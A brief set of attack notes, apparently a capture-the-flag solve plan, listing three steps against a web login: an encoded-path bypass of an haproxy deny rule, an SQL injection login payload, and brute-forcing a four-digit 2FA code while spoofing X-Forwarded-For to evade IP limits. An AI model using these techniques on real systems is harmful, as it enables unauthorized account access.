'''
Use Burp Suite.

1. Bypass haproxy deny of /auth/login

/%2fauth/log

2. SQL injection in login

username=admin' OR 1==1;--
password=x

3. Brute Force for Verify 2FA

0000-9999 for 2fa-code
Dynamic IP for IP (X-Forwarded-For)

Simplelist
FitchFork

Always Forwarded


But... BP is too slow, have to use script in vps...

'''
